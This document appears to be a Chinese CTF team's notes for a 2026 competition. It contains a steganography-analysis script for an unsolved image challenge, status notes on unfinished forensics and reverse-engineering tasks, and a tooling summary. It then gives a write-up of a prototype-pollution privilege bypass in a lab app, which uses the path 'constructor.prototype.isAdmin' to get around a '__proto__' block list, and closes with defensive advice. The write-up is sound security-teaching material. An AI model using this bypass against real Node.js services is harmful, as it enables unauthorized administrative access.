- 3645x729 图 = 729x729 逻辑单元（每单元 5px 宽），中间列（x≡2 mod 5）承载 1 bit：`mid = round(0.1344*cover + 27.8 + 165.1*bit)`，RGB 三通道同 bit，残差纯高斯 σ=0.87。
- 得到 729² 比特矩阵，byte 熵 7.9972/8.0、各阶自相关 ~0。

#### 未突破

- 光栅/列/蛇形/Peano/三进制 Z 序/螺旋×3/对角线 ×8 对称 × msb/lsb 等所有读取序下均与 iid 随机不可区分；bit 级对齐搜 flag{、单字节 XOR、与封面比特面 XOR、FFT、自 XOR（视觉密码假设）全部无果。
- 结论：载荷疑似经密钥白化/加密（本地无密钥线索），或读取方式依赖未猜到的分形参数。建议方向：确认湾区杯真实 flag 前缀并重跑 bit 搜索；尝试非标准 Peano 定向、Hilbert(1024) 滤窗、以封面 plasma 参数化重建封面做差分。

#### 完整脚本

`misc-05/solve.py`：

```python
#!/usr/bin/env python3
# FractalTrace (湾区杯2026 MISC) — analysis pipeline
# Fully reverses the embedding layer; the 729x729 mark-bit matrix it yields is
# statistically iid in every reading order tried (see result.md).
import numpy as np
from PIL import Image

SRC = r"C:/Users/12558/Desktop/CTF/湾区杯2026/MISC/FractalTrace/image.png"


def peano_path(k):
    """L-system Peano curve; returns 9^k lattice points covering [0,3^k)^2."""
    L = "LFRFL-F-RFLFR+F+LFRFL"
    R = "RFLFR+F+LFRFL-F-RFLFR"
    s = "L"
    for _ in range(k):
        s = "".join(L if c == "L" else R if c == "R" else c for c in s)
    x = y = 0
    dx, dy = 1, 0
    pts = [(0, 0)]
    for c in s:
        if c == "F":
            x += dx; y += dy
            pts.append((x, y))
        elif c == "+":
            dx, dy = -dy, dx
        elif c == "-":
            dx, dy = dy, -dx
    return pts


def snake3(n):
    if n == 1:
        return [(0, 0)]
    sub = snake3(n // 3)
    pts, s = [], n // 3
    for gy in range(3):
        xs_ = range(3) if gy % 2 == 0 else range(2, -1, -1)
        for gx in xs_:
            for (x, y) in sub:
                pts.append((gx * s + x, gy * s + y))
    return pts


def zorder3(n):
    pts, k, t = [], 0, n
    while t > 1:
        t //= 3; k += 1
    for idx in range(n * n):
        x = y = 0; t = idx; p = 1
        for _ in range(k):
            d = t % 9; t //= 9
            y += (d // 3) * p; x += (d % 3) * p; p *= 3
        pts.append((x, y))
    return pts


def main():
    a = np.asarray(Image.open(SRC)).astype(np.float64)
    H, W, _ = a.shape
    assert (H, W) == (729, 3645), (H, W)

    # Logical grid: 729x729 cells, 5 px wide each. Column x=2 (mod 5) is the mark.
    cells = a.reshape(729, 729, 5, 3)
    cover = cells[:, :, [0, 1, 3, 4], :].mean(axis=2)
    mid = cells[:, :, 2, :]

    # Mark model (fitted): mid = round(0.1344*cover + 27.8 + 165.1*bit)
    # R,G,B carry the identical bit; residual after fit is pure Gaussian (std 0.87).
    # Absolute threshold 128 is exact because mark ranges stay clear of it.
    bits = (mid[:, :, 0] > 128).astype(np.uint8)
    assert ((mid[:, :, 1] > 128) == bits).all()
    print("mark matrix: 729x729, ones frac =", bits.mean())

    # --- statistics: matrix is iid-indistinguishable ---
    x = bits.astype(np.float64) - bits.mean()
    v = x.var()
    print("lag-x corr:", [round(float((x[:, :-k] * x[:, k:]).mean() / v), 5) for k in (1, 2, 3, 27, 81, 243)])
    by = np.packbits(bits.ravel())
    p = np.bincount(by, minlength=256) / by.size
    print("byte entropy:", round(float(-(p[p > 0] * np.log2(p[p > 0])).sum()), 4), "bits (8.0 = random)")

    # --- dump streams in every candidate order for offline analysis ---
    peano = np.array([(px, -py) for px, py in peano_path(6)])
    snake = np.array(snake3(729))
    z3 = np.array(zorder3(729))

    def dihedral(m, k):
        if k & 4:
            m = m[::-1, :]
        return np.rot90(m, k & 3)

    paths = {"scanline": None, "colmajor": "T", "peano": peano, "snake3": snake, "z3": z3}
    for k in range(8):
        m = dihedral(bits, k)
        for name, pth in paths.items():
            s = m.ravel() if pth is None else (m.T.ravel() if isinstance(pth, str) else m[pth[:, 1], pth[:, 0]])
            np.packbits(s).tofile(f"stream_{name}_sym{k}.bin")
    print("streams dumped: stream_<order>_sym<0..7>.bin (MSB-first pack)")


if __name__ == "__main__":
    main()
```


#### Flag

```
N/A
```

---

## 未完成题目

### whoami（misc-02）— 无 result

2GB Windows 物理内存镜像取证（文件名为 `whoami？.raw`，含全角问号）。工作目录内已有 volatility3 分析产物（filescan、vadinfo、dpapimk、EFS/DPAPI 相关提取脚本与中间产物，含 alice/bob 两个 container 与 EFS 私钥提取线索），但最终未产出 result.md，flag 未取得。

### passkey_vault（re-01）— 无 result

CTAP-CBOR 虚拟认证器逆向（stripped ELF + resident_vault.img + browser_probe.ctap）。工作目录内已有 page0/page1 明文提取、vault 解析、多轮 release 爆破脚本（brute_release2/3.py、decrypt_vault.py、sub_404230 分析），分析中途停止，无 result.md。

---

## 通用工具与环境备注

- **静态分析**：idalib-mcp（ELF/内核模块/SO 反编译）、jadx-mcp（APK）为全队主力；card 明令禁止只 strings/objdump 蛮干。
- **exploit**：pwntools + ROPgadget（多数在 Docker 容器内跑，宿主 Windows Python 为 PEP668 受管环境）；远程交互脚本均带超时、可独立复跑。
- **格攻击**：fpylll 无 Windows/cp312 wheel，统一走 Docker（ntru-solver 镜像）；crypto-02 更是纯 Python LLL + mpmath 高精度 Babai。
- **code-sandbox MCP**：多轮实测 initialize/exec 超时不可用，全部题目按协议降级宿主/Docker 执行并在 result 注明。
- **远程地址时效**：多个旧远程地址已废弃（39.106.207.35:22626、60.205.188.28:33003、123.56.0.182:30821 等），最终成功地址以各 result.md 为准。

# ThemeForge 权限绕过 WriteUp

## 题目概述

ThemeForge 是一个设计系统实验室，允许用户通过“点路径”即时修改个人主题配置。站点宣称核心身份字段（`id`、`role`、`isAdmin`）已被锁定，但管理员的隐藏色（Admin Color Vault）仍有可能被普通用户看到。目标是通过权限边界中的漏洞，以普通设计师身份访问 `/api/admin/flag` 接口，获取 `flag`。

## 漏洞分析

### 1. 权限校验逻辑

服务端（`app.js`）中，`/api/admin/flag` 路由的校验代码如下：

javascript

```
if (req.method === 'GET' && url.pathname === '/api/admin/flag') {
  if (profile.isAdmin !== true) {
    return sendJson(res, 403, {
      error: 'Administrator theme preview required',
    });
  }
  return sendJson(res, 200, { flag: VAULT_VALUE });
}
```



可见，只有当当前会话对应的 `profile` 对象的 `isAdmin` 属性严格等于 `true` 时，才能获取 `flag`。

### 2. 身份字段“加锁”的实现

`Profile` 类构造时并不设置 `isAdmin`，因此默认 `undefined`。服务端提供了修改主题的接口 `/api/profile/patch`，其中 `setProfilePath` 函数负责根据用户提供的路径修改 `profile` 对象。

为了防止直接修改核心字段，该函数做了两项检查：

- **根路径保护**：`protectedRoots` 包含 `id`、`role`、`isAdmin`，若路径的第一个分段属于这些名称则直接拒绝。
- **黑名单过滤**：禁止路径中包含 `__proto__` 分段。

javascript

```
const protectedRoots = new Set(['id', 'role', 'isAdmin']);
if (protectedRoots.has(parts[0])) {
  throw new Error('protected profile field');
}
if (parts.includes('__proto__')) {
  throw new Error('unsafe path segment');
}
```



### 3. 绕过思路 —— 原型污染

虽然无法直接设置 `profile.isAdmin`，但 JavaScript 对象存在原型链机制。如果在 `Profile` 的原型（`Profile.prototype`）上添加 `isAdmin` 属性，那么所有 `Profile` 实例（包括 `profile`）在访问 `isAdmin` 时，若自身没有该属性，就会沿着原型链找到原型上的值。

**关键点**：`setProfilePath` 并未限制通过 `constructor.prototype` 访问原型。路径 `constructor.prototype.isAdmin` 可以绕过 `__proto__` 黑名单，且根分段 `constructor` 不在保护列表中。

- `profile.constructor` → `Profile` 构造函数
- `Profile.prototype` → `Profile` 的原型
- 在该原型上设置 `isAdmin = true`，即可使所有 `Profile` 实例的 `isAdmin` 变为 `true`（除非实例自身显式覆盖，但本例中没有）。

## 利用步骤

### 1. 启动应用并访问

bash

```
npm start
# 访问 http://localhost:3000
```



### 2. 执行原型污染

在“路径编辑器”中填写：

- **属性路径**：`constructor.prototype.isAdmin`
- **属性值**：`true`
- **勾选**“将属性值作为布尔值提交”（确保提交布尔值而非字符串）

点击 **“应用补丁”**。

服务端处理逻辑：

- 路径合法（包含字母、点，不包含 `__proto__`）
- 遍历路径：`profile.constructor` 得到 `Profile`，继续 `prototype` 得到 `Profile.prototype`，最后设置 `Profile.prototype.isAdmin = true`
- 返回成功响应，且 `profileView` 中 `effectiveAdmin` 变为 `true`（因为此时 `profile.isAdmin` 从原型上取到 `true`）

### 3. 请求访问保险库

点击 **“请求访问”** 按钮，前端会请求 `/api/admin/flag`。此时 `profile.isAdmin === true`，校验通过，服务端返回包含 `flag` 的 JSON。

### 4. 获取 Flag

响应内容形如：

json

```
{
  "flag": "flag{...}"
}
```



从返回结果中提取 `flag` 字段即为答案。

## 漏洞总结

此漏洞是由于对原型链攻击的防护不充分导致的。虽然过滤了 `__proto__`，但未考虑到 `constructor.prototype` 同样能访问原型，使得攻击者可以污染 `Profile` 原型，从而向所有实例注入 `isAdmin` 属性，绕过管理员权限检查。

**防御建议**：

- 禁止使用 `constructor`、`prototype` 等敏感路径分段。
- 在设置属性前，检查路径是否指向原型对象。
- 或使用 `Object.create(null)` 彻底隔离原型（当前 `theme` 已隔离，但 `profile` 本身未隔离）。
- 更好的做法是使用 `Map` 或白名单方式管理可修改的配置项，而非动态路径赋值。
